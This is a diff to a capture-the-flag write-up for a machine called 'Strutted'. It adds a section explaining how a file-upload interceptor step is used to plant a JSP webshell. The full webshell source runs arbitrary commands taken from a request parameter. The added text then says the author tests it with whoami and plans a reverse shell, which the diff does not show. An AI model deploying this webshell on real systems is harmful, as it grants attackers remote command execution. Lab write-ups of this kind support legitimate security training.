@@ -207,7 +207,7 @@ def exploit(self) -> None:
 
 <br />
 
-2.- Now, we change `"upload"` to `"Upload"` to activate the interceptor being able to `intercept` the file `before` it is uploaded. We also add a `java oneliner` to the image `data`:
+2.- Second, we change `"upload"` to `"Upload"` to activate the interceptor being able to `intercept` the file `before` it is uploaded. We also add a `java oneliner` to the image `data`:
 
 <br />
 
@@ -228,5 +228,54 @@ def exploit(self) -> None:
 <br />
 
 ![10](../../../assets/images/Strutted/10.png)
+
+<br />
+
+### Webshell:
+
+Now, we can `repeat` the process with a `webshell` to be able to get the `RCE`:
+
+<br />
+
+```jsp
+<%@ page import="java.io.*, java.util.*, java.net.*" %>
+<%
+    String action = request.getParameter("action");
+    String output = "";
+
+    try {
+        if ("cmd".equals(action)) {
+            String cmd = request.getParameter("cmd");
+            if (cmd != null) {
+                Process p = Runtime.getRuntime().exec(cmd);
+                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    output += line + "\\n";
+                }
+                reader.close();
+            }
+        } else {
+            output = "Unknown action.";
+        }
+    } catch (Exception e) {
+        output = "Error: " + e.getMessage();
+    }
+    response.setContentType("text/plain");
+    out.print(output);
+%>
+```
+
+<br />
+
+Once uploaded, we try to `run` a `whoami`:
+
+<br />
+
+
+
+<br />
+
+Perfect!! We can `execute` commands in the system, let's gain `access` with a `Reverse Shell`:
 
 <br />
